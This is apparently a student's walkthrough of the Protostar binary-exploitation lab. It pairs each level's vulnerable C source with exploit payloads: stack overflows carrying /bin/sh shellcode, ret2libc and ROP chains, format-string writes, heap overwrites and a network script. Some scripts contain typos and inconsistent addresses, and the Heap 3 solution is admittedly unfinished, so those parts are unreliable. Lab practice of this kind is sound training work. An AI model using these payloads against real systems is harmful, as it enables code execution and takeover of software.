# Protostar

## Stack 5

```c
int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

just direct BOF we will overwite the return address of the `main` with the address of the beginning of our evel code which begins with nope slids and then the shellcode
> the reason of using cat to serve our shell with stdi/o

```sh
$ (python -c 'import struct;
BOF = 76*"A";
jmpaddr=struct.pack("I",0xbffff7f0);
nope = 100*"\x90"; 
shell ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; 
print BOF+jmpaddr+nope+shell'; cat) | ./stack5
```

## Stack 6

```c
void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

in this program it prevents us from jumping to any address in the stack as an example of non executable stack kanari, NX bit, DEP, ASLR... so we must jump to another addr out of the stack.

### jmp to ret again

the trick on this techinque is to jump to ret agin which means that the `0x080484f9 <getpath+117>:  ret` instruction will pop the top of the stack again to `EIP`
the stack will looks like:
| Stack          |
| -------------- |
| .........      |
| 0x080484f9     |
| evil code addr |
| evil code      |
| .........      |

```py
import struct
BOF = 80*"A"
ret=struct.pack("I",0x080484f9)
jmpaddr=struct.pack("I",0xbffff7f0)
nope = 100*"\x90";
shell ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print BOF + ret + jmpaddr + nope + shell
```

### ret2libc

on this technique we will make our jmp addr the `system('/bin/sh')` function this built-in function in normal usage called with with one string argument the program instructions in normal case of call system() be like this :
| stack                  |
| ---------------------- |
| .........              |
| ret addr from system() |
| '/bin/sh'              |
| .........              |

so we will make the stack looks like this but we need the addr of `system()` and an addr to the string`'/bin/sh'` and return addr dosent matter we don't need to return :)

- we can get the system addr from `libc` which standard library that linked to any executable binary and by using `$ ldd ./stack6` we can see the linked system libraries and by getting the addr of `/lib/libc.so.6 (0xb7e99000)`
- by using `gdb> print system` we can get the addr of system fun `{<text variable, no debug info>} 0xb7ecffb0 <__libc_system>`
- by using command `$ strings -a -t x /lib/libc.so.6 |grep /bin/sh` we now have the offset with hex of the string */bin/sh* in libc  `0x11f3bf:/bin/sh` by adding the offset to libc addr we now have the real address of the string in memory `'/bin/sh' addr = 0xb7e97000+0x11f3bf`
- `system addr = 0xb7ecffb0` , `'/bin/sh' addr = 0xb7e97000+0x11f3bf`time to write our magical exploit

```py
import struct
BOF = 80*"A"
system=struct.pack("I",0xb7ecffb0)
system_ret='BBBB'
bash=struct.pack("I",0xb7e97000+0x11f3bf)
print BOF + system + syetem_ret + bash
```

## Stack 7

```c
char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

- ### jmp to ret again_

like stack6 we can solve stack7 with this technique

```py
import struct
BOF = 80*"A"
ret=struct.pack("I",0x08048544)
jmpaddr=struct.pack("I",0xbffff7f0)
nope = 100*"\x90";
shell ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print BOF + ret + jmpaddr + nope + shell
```

- ### ret2.text

similar to ret2libc but here we cant ret2libc so we will use ROP gadgets used in .text we can find this by `msfelfscsn` or `ROBgadget`. imma use `ROBgadget` here
1- first i need to copy *stack7* to my kali machine

```sh
~$ scp user@192.168.87.144:/opt/protostar/bin/stack7 /tmp/
```

2- i need to find suitable ROP gadget with pop and ret to use

```sh
/tmp$ ROPgadget --binary stack7
...........
0x08048493 : pop ebp ; ret
0x08048381 : pop ebx ; leave ; ret
0x08048492 : pop ebx ; pop ebp ; ret
0x080485c5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048614 : pop ecx ; pop ebx ; leave ; ret
0x080485c7 : pop edi ; pop ebp ; ret
0x080485c6 : pop esi ; pop edi ; pop ebp ; ret
..........
```

imma use the simplest one *0x08048493 : pop ebp ; ret*

3- put the address of the gadget insted of ret address in the above solutions

4- pop a demo from dem address let's say 'BBBB'

5- after that we can use ret2libc and excute *system()* as in stack6 or return to shellcode

6- finally place the address of shellcode to return to it

```py
import struct
BOF = 80*"A"
ROPgadget=struct.pack("I",0x08048493) # pop ret
pop="BBBB"
ret=struct.pack("I",0xbffff7f0)
nope = 100*"\x90";
shell ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print BOF +ROPgadget+pop+ ret + nope + shell
```

## format 0

```c
void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

`sprintf` doesn't validate the string length so we can easly cause BOF and overwrite the target with *0xdeadbeef*

```sh
/opt/protostar/bin$ ./format0 `python -c 'print "\xef\xbe\xad\xde"*17'`
```

17*4 bytes = 64 buffer + 4 of target

## format 1

```c
int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

get address of target = 0x08049638

```sh
/opt/protostar/bin$ objdump -t format1
```

then passed it as block of your input and try to hit it with %x after finding suitable pattern of format input that hit the stored address that we passed and then replace %x of this position only with %n to overwrite the target with the length of our input
> note:
> make your target address between known pattern to easly find and recognize its position in the output.
> ex: `"DDDD"+ "\x38\x96\x04\x08" + "DDDD" + 168*" %x"`,
> the space before %x to make the output addresses separated and recognizable

```sh
/opt/protostar/bin$ ./format1 "`python -c 'print "\x38\x96\x04\x08"+126*"  %x"+"  %n"+"BBBB"'`"
```

## Format 2

```c
int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

if we try to enter sequence of alphabets as input and the %x%x%x%x%x%x:

```sh
/opt/protostar/bin$ ./format2
AAAABBBBCCCCDDDDEEEE%x%x%x%x%x
AAAABBBBCCCCDDDDEEEE200b7fd8420bffff6144141414142424242
target is 0 :(
```

we'll find that these addresses values *200b7fd8420bffff614* alwayes printed before our input hex values in memory, like so:
`AAAA <200b7fd8420bffff614> 41414141` so this sequence has *length=19*
so we need input to be looks like this  `target_address + 41_byte + 3*"%x" + "%n"` = 64 byte length
get address of target like in format1 = 0x080496e4

```sh
/opt/protostar/bin$ objdump -t format1
```

```sh
/opt/protostar/bin$ python -c 'print "\xe4\x96\x04\x08" + 41*"A" + 3*"%x" + "%n"'|./format2
```

## Format 3

```c
int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

```sh
python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820d%12$hn" + "%43966d%13$hn" ' |./format3
```

```sh
python -c 'print "\xf4\x96\x04\x08" + "%16930112d%12$08n" ' |./format3
```

## Format 4

```c
void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

hello: 080484b4

0x8049724 >>> \x24\x97\x04\x08

```sh
python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08%33964d%4$hn%33616d%5$hn" ' |./format4
```

## Heap 0

```c
struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

long pattern input from gdb
hit the eip with overwrite the fb() address in the heap `kkkk'
get winner() address with`print winner` in gdb or by `obidumb -t heap0`
replace kkkk with winner addres 0x08048464 >> little indian \x64\x84\x04\x08

```sh
./heap0 `python -c 'print "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x64\x84\x04\x08"'`
```

## Heap 1

```c
struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

try run without input in gdb we got segmentation fault because strcpy from address source=0x

pass long arguments `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ aaaabbbbccccddddeeeeffff`

we somehow overwite the destination address=**FFFF** i2->name

now we could replace it with GOTaddress,`jmp *GOTaddress`from calling puts->write with printf(). `$ 
disassable <puts@plt>_address`

after that we will cotrol eip with value aaaa which we write it insted of GOTaddress

now we done by replacing **aaaa** with winner address, `print winner` in gdb or by `obidumb -t heap1`

```sh
`python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"+" \x94\x84\x04\x08"'`
```

## Heap 2

```c
struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

```sh
/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth aaaa
[ auth = 0x804c008, service = (nil) ]
login
please enter your password
[ auth = 0x804c008, service = (nil) ]
serviceAAAAAAAAAAAAAAAA       
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

## Heap 3

[full explaination](https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13)

![negative size](https://miro.medium.com/max/551/1*K7xYXTGesD2qTTuhHeS_fQ.jpeg)

i followed as much as i understood

```py
print "AAAA" + " " +
      14*"\x90" +"shellcode" +(30-len(shellcode)-14)*"\x90" + " " +
      struct.pack('I',0xfffffffc)*2 + "\x90\x90\x90\x90" + "puts@GOT_addr" + "shellcode_addr"
```

stillllllllllllllllllllllllll didn't get it well :(

## Net 1

```c
void run()
{
  unsigned int i;
  unsigned int wanted;

  wanted = random();

  printf("Please send '%d' as a little endian 32bit int\n", wanted);

  if(fread(&i, sizeof(i), 1, stdin) == NULL) {
      errx(1, ":(\n");
  }

  if(i == wanted) {
      printf("Thank you sir/madam\n");
  } else {
      printf("I'm sorry, you sent %d instead\n", i);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :> */
  srandom(time(NULL));

  run();
}
```

```py
import socket 
import struct            
    
s = socket.socket()
   
s.connect(('192.168.87.144', 2999))  
 
s.send(struct.pack("I",int((s.recv(1024)).split("'")[1])))

print s.recv(1024)

s.close()     
```
